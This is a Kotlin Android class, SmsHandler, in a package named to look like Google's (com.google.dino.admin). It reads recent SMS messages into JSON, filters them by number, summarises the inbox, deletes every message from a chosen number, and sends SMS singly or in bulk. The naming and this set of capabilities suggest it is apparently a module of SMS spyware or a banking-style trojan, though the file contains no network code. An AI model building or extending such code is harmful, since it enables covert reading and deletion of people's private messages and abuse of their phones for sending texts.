package com.google.dino.admin

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsHandler(private val context: Context) {

    companion object {
        private const val TAG = "SmsHandler"
        private val SMS_URI = Telephony.Sms.CONTENT_URI
    }

    fun sendSms(phoneNumber: String, message: String): Boolean {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            Log.d(TAG, "SMS sent to $phoneNumber")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
            false
        }
    }

    fun sendMultipleSms(phoneNumbers: List<String>, message: String): Map<String, Boolean> {
        val results = mutableMapOf<String, Boolean>()
        val smsManager = SmsManager.getDefault()

        for (number in phoneNumbers) {
            try {
                smsManager.sendTextMessage(number, null, message, null, null)
                results[number] = true
                Log.d(TAG, "SMS sent to $number")
            } catch (e: Exception) {
                results[number] = false
                Log.e(TAG, "Failed to send SMS to $number", e)
            }
        }

        return results
    }

    fun getAllSms(): JSONArray {
        val smsList = JSONArray()
        val cursor: Cursor? = context.contentResolver.query(
            SMS_URI,
            null,
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER + " DESC LIMIT 100"
        )

        cursor?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

            while (it.moveToNext()) {
                val sms = JSONObject()
                
                val address = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
                val date = if (dateIndex != -1) it.getLong(dateIndex) else 0L
                val body = if (bodyIndex != -1) it.getString(bodyIndex) else ""
                val type = if (typeIndex != -1) it.getInt(typeIndex) else -1

                sms.put("address", address)
                sms.put("date", date)
                sms.put("date_formatted", formatDate(date))
                sms.put("body", body)
                sms.put("type", type)
                sms.put("type_name", getSmsTypeName(type))

                smsList.put(sms)
            }
        }

        return smsList
    }

    fun getSmsByNumber(phoneNumber: String): JSONArray {
        val smsList = JSONArray()
        val cursor: Cursor? = context.contentResolver.query(
            SMS_URI,
            null,
            "${Telephony.Sms.ADDRESS} = ?",
            arrayOf(phoneNumber),
            Telephony.Sms.DATE + " DESC"
        )

        cursor?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

            while (it.moveToNext()) {
                val sms = JSONObject()
                
                val address = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
                val date = if (dateIndex != -1) it.getLong(dateIndex) else 0L
                val body = if (bodyIndex != -1) it.getString(bodyIndex) else ""
                val type = if (typeIndex != -1) it.getInt(typeIndex) else -1

                sms.put("address", address)
                sms.put("date", date)
                sms.put("date_formatted", formatDate(date))
                sms.put("body", body)
                sms.put("type", type)
                sms.put("type_name", getSmsTypeName(type))

                smsList.put(sms)
            }
        }

        return smsList
    }

    fun getSmsCount(): Map<String, Int> {
        val counts = mutableMapOf<String, Int>()
        
        val cursor: Cursor? = context.contentResolver.query(
            SMS_URI,
            arrayOf(Telephony.Sms.ADDRESS, "COUNT(*) as count"),
            null,
            null,
            "count DESC"
        )

        cursor?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val countIndex = it.getColumnIndex("count")

            while (it.moveToNext() && counts.size < 10) {
                val address = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
                val count = if (countIndex != -1) it.getInt(countIndex) else 0
                counts[address] = count
            }
        }

        return counts
    }

    fun deleteSms(phoneNumber: String): Int {
        return try {
            val rowsDeleted = context.contentResolver.delete(
                SMS_URI,
                "${Telephony.Sms.ADDRESS} = ?",
                arrayOf(phoneNumber)
            )
            Log.d(TAG, "Deleted $rowsDeleted SMS for $phoneNumber")
            rowsDeleted
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete SMS", e)
            0
        }
    }

    fun getSmsStatistics(): JSONObject {
        val stats = JSONObject()
        
        val cursor: Cursor? = context.contentResolver.query(
            SMS_URI,
            arrayOf(
                "SUM(CASE WHEN ${Telephony.Sms.TYPE} = 1 THEN 1 ELSE 0 END) as inbox_count",
                "SUM(CASE WHEN ${Telephony.Sms.TYPE} = 2 THEN 1 ELSE 0 END) as sent_count",
                "COUNT(*) as total_count"
            ),
            null,
            null,
            null
        )

        cursor?.use {
            if (it.moveToFirst()) {
                val inboxCount = it.getInt(it.getColumnIndexOrThrow("inbox_count"))
                val sentCount = it.getInt(it.getColumnIndexOrThrow("sent_count"))
                val totalCount = it.getInt(it.getColumnIndexOrThrow("total_count"))

                stats.put("inbox_count", inboxCount)
                stats.put("sent_count", sentCount)
                stats.put("total_count", totalCount)
                stats.put("updated_at", System.currentTimeMillis())
            }
        }

        return stats
    }

    fun monitorIncomingSms(callback: (address: String, body: String, date: Long) -> Unit) {
        // This would be implemented with a ContentObserver
        // For now, it's a placeholder
        Log.d(TAG, "SMS monitoring enabled")
    }

    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("dd-MM-yyyy | hh:mm a", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }

    private fun getSmsTypeName(type: Int): String {
        return when (type) {
            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Inbox"
            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "Outbox"
            Telephony.Sms.MESSAGE_TYPE_FAILED -> "Failed"
            Telephony.Sms.MESSAGE_TYPE_QUEUED -> "Queued"
            else -> "Unknown"
        }
    }

    fun sendSmsWithDeliveryReport(
        phoneNumber: String, 
        message: String,
        onSent: () -> Unit = {},
        onDelivered: () -> Unit = {}
    ) {
        try {
            val smsManager = SmsManager.getDefault()
            
            val sentIntent = android.app.PendingIntent.getBroadcast(
                context, 0,
                android.content.Intent("SMS_SENT"),
                android.app.PendingIntent.FLAG_IMMUTABLE
            )
            
            val deliveredIntent = android.app.PendingIntent.getBroadcast(
                context, 0,
                android.content.Intent("SMS_DELIVERED"),
                android.app.PendingIntent.FLAG_IMMUTABLE
            )

            smsManager.sendTextMessage(phoneNumber, null, message, sentIntent, deliveredIntent)
            Log.d(TAG, "SMS with delivery report sent to $phoneNumber")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS with delivery report", e)
        }
    }
}
